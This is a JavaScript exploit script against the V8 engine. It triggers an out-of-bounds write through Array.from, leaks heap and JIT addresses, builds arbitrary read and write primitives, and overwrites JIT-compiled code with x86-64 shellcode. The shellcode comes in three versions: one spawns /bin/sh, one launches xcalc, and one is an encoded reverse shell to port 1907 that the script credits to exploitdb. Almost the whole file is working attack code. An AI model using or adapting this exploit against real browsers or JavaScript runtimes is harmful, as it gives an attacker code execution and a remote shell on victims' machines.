function d_to_i2(c){var b=new Uint32Array(new Float64Array([c]).buffer);return[b[1],b[0]]}
 
function i2_to_d(a){return new Float64Array(new Uint32Array([a[1],a[0]]).buffer)[0]}
 
function i2_to_hex(a){var c=("00000000"+a[0].toString(16)).substr(-8);var b=("00000000"+a[1].toString(16)).substr(-8);return[c,b]}
 
function p_i2(a){console.log(i2_to_hex(d_to_i2(a))[0]+i2_to_hex(d_to_i2(a))[1])}
 
function debug_log(a){return console.log("[DEBUG] "+a)}
function hex(a){return"0x"+("00000000"+a[0].toString(16)).slice(-8)+("00000000"+a[1].toString(16)).slice(-8)};
 
let oobArray = [];
let maxSize = 1028 * 30; // need large than 15,for leaking array(9 is enough) ,for leaking jit it need to be 15
Array.from.call(function(){return oobArray},{[Symbol.iterator]:_=>({counter:0,next(){let result=this.counter++;if(this.counter>maxSize){oobArray.length=0;return{done:true}}else{return{value:result,done:false}}}})});
 
function run_shellcode(x) {return x + 42;}
 
for (var i = 0; i < 10000; i++) { run_shellcode(i);}
 
 
//%DebugPrint(run_shellcode);
 
//Change type of the array for outputing address into form of double
//not sure why using 13.37 here will crash other part of the exploit ?
oobArray[1] = 2261634.5098039214;
oobArray[2] = 156842099844.51764
 
var ab=[]

//it will arraybuffer of 0x1337
for (var i = 0; i < 0x10000; i++) {ab.push(new ArrayBuffer(0x1337));}
 
leaked_ix = 0
//0x0000133700000000 // 1.0438097295758e-310
console.log('[+] Searching for the oob location ')
for(var j=0;j<0x10000;j=j+1){if(oobArray[j]==1.0438097295758e-310){leaked_ix=j;oobArray[j]=156842099844.51764;console.log("[+] got the oobArray");console.log("position : "+leaked_ix);break}};
 
 
 
console.log("[+] Leaked Heap Address")
p_i2(oobArray[leaked_ix+1])
 
console.log('[+] Leaked back buffer address')
p_i2(oobArray[leaked_ix-1])
 
fuckedup = 0
console.log('[+] Searching for the buffer ')
for(var j=0; j < 0x10000; j=j+1){if(ab[j].byteLength!=0x1337){fuckedup = j;oobArray[leaked_ix]=1.0438097295758e-310;console.log('[+] got the buffer');console.log('position : '+fuckedup);break;}}
 
console.log('[+] Setup env for leaking jit address')
 
let oobArray_jit = [];
let maxSize_ = 1028 * 15; // need large than 15
 
//the length need set to not equal 0 and re-trigger the bug for leaking jit address
Array.from.call(function(){return oobArray_jit},{[Symbol.iterator]:_=>({counter:0,next(){let result=this.counter++;if(this.counter>maxSize_){oobArray_jit.length=1;return{done:true}}else{return{value:result,done:false}}}})});
 
oobArray_jit[1] = 2261634.5098039214;
oobArray_jit[2] = 156842099844.51764
 
var ab_2 = [];
var fake_func_2 =[]
 
//this will make the content appears on the same page
//if only do fake_func_2.push({}) , likely the content will on another page of the memory
//by push as {}, the number and function obj will be stored continuously on memory
for (var i = 0; i < 0x10000; i++) {ab_2.push(new ArrayBuffer(0x1111));fake_func_2.push({s:1.0438097295758e-310,tt:run_shellcode,p:2.417370521746097e+35});}
 
 
obj_addr = 0;
console.log('[+] Searching for the JIT address ')
for(var i=0; i < 0x20000; i=i+1){if(oobArray_jit[i]==2.417370521746097e+35){console.log('[+] Got the jit address from position : '+(i-1));p_i2(oobArray_jit[i-1]);obj_addr = oobArray_jit[i-1];break;}}
 
function read(addr){oobArray[leaked_ix+1] = addr;var v = new Float64Array(ab[fuckedup], 0, 8);return v[0];}
 
function write(addr,value){oobArray[leaked_ix+1] = addr;var u8 = new Uint8Array(ab[fuckedup]);for (var i = 0; i < value.length; i++){u8[i] = value[i];}}
 
console.log("[+] Leaking function obj address ")
obj_addr = d_to_i2(obj_addr)
//correct positioning
//in v8 ,pointer tagging is +1, so we need -1 for resolving the actual addr
//leak -1+0x30 -> jit region address
//0x30 offset is found from gdb
obj_addr[1]=obj_addr[1]-1+48
obj_addr = i2_to_d(obj_addr)
 
p_i2(obj_addr)
 
console.log("[+] Leaking actual JIT address ")
jit = read(obj_addr)
jit = d_to_i2(jit)
//shellcode addr ->jit region address-1 +0x60
//0x60 offset is found from gdb
jit[1] = jit[1] -1 + 96
jit = i2_to_d(jit)
 
p_i2(jit)
 
//shell
sc=[0x6A, 0x68, 0x48, 0xB8, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x2F, 0x2F, 0x73, 0x50, 0x48, 0x89, 0xE7, 0x31, 0xF6, 0x6A, 0x3B, 0x58, 0x99, 0x0F, 0x05]
 
sc=[0x6A, 0x68, 0x48, 0xB8, 0x2F, 0x78, 0x63, 0x61, 0x6C, 0x63, 0x00, 0x00,0x50, 0x48, 0xB8, 0x2F, 0x75, 0x73, 0x72, 0x2F, 0x62, 0x69, 0x6E, 0x50, 0x48, 0x89, 0xE7, 0x31, 0xF6, 0x6A, 0x3B, 0x58, 0x99, 0x0F, 0x05]
 
//reverse shell to 1907 from exploitdb
sc=[0x48, 0x31, 0xC9, 0x48, 0x81, 0xE9, 0xF6, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x05, 0xEF, 0xFF, 0xFF, 0xFF, 0x48, 0xBB, 0xDF, 0x4B, 0x06, 0xB1, 0x71, 0x71, 0x46, 0x28, 0x48, 0x31, 0x58, 0x27, 0x48, 0x2D, 0xF8, 0xFF, 0xFF, 0xFF, 0xE2, 0xF4, 0xB5, 0x62, 0x5E, 0x28, 0x1B, 0x73, 0x19, 0x42, 0xDE, 0x15, 0x09, 0xB4, 0x39, 0xE6, 0x0E, 0x91, 0xDD, 0x4B, 0x01, 0xC2, 0x0E, 0x71, 0x46, 0x29, 0x8E, 0x03, 0x8F, 0x57, 0x1B, 0x61, 0x1C, 0x42, 0xF5, 0x13, 0x09, 0xB4, 0x1B, 0x72, 0x18, 0x60, 0x20, 0x85, 0x6C, 0x90, 0x29, 0x7E, 0x43, 0x5D, 0x29, 0x21, 0x3D, 0xE9, 0xE8, 0x39, 0xFD, 0x07, 0xBD, 0x22, 0x68, 0x9E, 0x02, 0x19, 0x46, 0x7B, 0x97, 0xC2, 0xE1, 0xE3, 0x26, 0x39, 0xCF, 0xCE, 0xD0, 0x4E, 0x06, 0xB1, 0x71, 0x71, 0x46, 0x28 ]
 
 
console.log("[+] Writing shellcode :) ")
write(jit,sc)
 
run_shellcode()
